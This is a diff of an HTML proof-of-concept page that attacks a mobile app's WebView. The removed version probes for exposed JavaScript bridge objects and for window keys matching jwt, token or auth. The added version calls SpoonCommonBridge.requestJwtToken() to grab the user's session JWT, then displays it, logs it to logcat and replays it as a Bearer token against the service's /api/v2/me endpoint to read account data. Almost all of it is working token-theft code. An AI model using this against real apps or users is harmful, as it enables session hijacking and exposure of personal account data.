@@ -1,36 +1,36 @@
-<html><head><title>POC</title></head>
-<body style="background:#fff;color:#000;font-size:20px;padding:10px;font-family:monospace;">
-<h1>Bridge Test</h1>
-<div id="s" style="font-size:28px;font-weight:bold;">...</div>
-<pre id="r" style="font-size:14px;white-space:pre-wrap;word-break:break-all;"></pre>
+<!DOCTYPE html>
+<html>
+<head><title>Event</title><meta name="viewport" content="width=device-width,initial-scale=1"></head>
+<body style="background:#fff;color:#000;font-size:12px;padding:5px;font-family:monospace;word-break:break-all;">
+<pre id="out"></pre>
 <script>
-var s=document.getElementById("s"),r=document.getElementById("r"),log=[];
-function L(t){log.push(t);r.textContent=log.join("\n");}
-
-// 1. Check specific bridges
-var targets=["SpoonCommonBridge","SpoonWebBridge","NativeBridge","Android"];
-for(var i=0;i<targets.length;i++){
-  try{var o=window[targets[i]];
-    if(o){L("FOUND:"+targets[i]+" keys="+Object.keys(o).join(","));}
-    else{L(targets[i]+": null");}
-  }catch(e){L(targets[i]+":"+e.message);}
+var out = document.getElementById("out");
+try {
+  var b = window.SpoonCommonBridge;
+  if (!b) { out.textContent = "NO BRIDGE"; throw "x"; }
+  
+  var jwt = b.requestJwtToken();
+  out.textContent = "JWT_LEN=" + (jwt ? jwt.length : 0) + "\nJWT=" + (jwt || "null");
+  
+  // console.log for logcat
+  console.log("SPOON_JWT=" + jwt);
+  console.log("SPOON_JWT_LEN=" + (jwt ? jwt.length : 0));
+  
+  // Also try to get user info via fetch to Spoon API
+  if (jwt && jwt.length > 10) {
+    fetch("https://www.spooncast.net/api/v2/me", {
+      headers: { "Authorization": "Bearer " + jwt, "Accept": "application/json" }
+    }).then(function(r) { return r.text(); }).then(function(t) {
+      console.log("SPOON_ME=" + t);
+      out.textContent += "\n\nAPI_ME=" + t.substring(0, 500);
+    }).catch(function(e) {
+      console.log("SPOON_ME_ERR=" + e.message);
+      out.textContent += "\n\nAPI_ERR=" + e.message;
+    });
+  }
+} catch(e) {
+  if (e !== "x") out.textContent += "\nERR=" + e.message;
 }
-
-// 2. List ALL window keys with relevant names
-var all=Object.keys(window);
-var rel=all.filter(function(k){return /bridge|spoon|native|jwt|token|auth/i.test(k);});
-L("--- relevant keys: "+(rel.length?rel.join(", "):"NONE"));
-
-// 3. Try enumerating iframe content
-L("--- total window keys: "+all.length);
-
-// 4. Try direct call anyway
-try{var t=window.SpoonCommonBridge&&window.SpoonCommonBridge.requestJwtToken&&window.SpoonCommonBridge.requestJwtToken();
-if(t){s.textContent="JWT:"+String(t).substring(0,40)+"...";s.style.color="green";L("JWT="+String(t).substring(0,80));}
-else{L("requestJwtToken: no return");}
-}catch(e){L("call err: "+e.message);}
-
-if(s.textContent==="..."){s.textContent="NO BRIDGE";s.style.color="red";}
 </script>
 </body>
 </html>
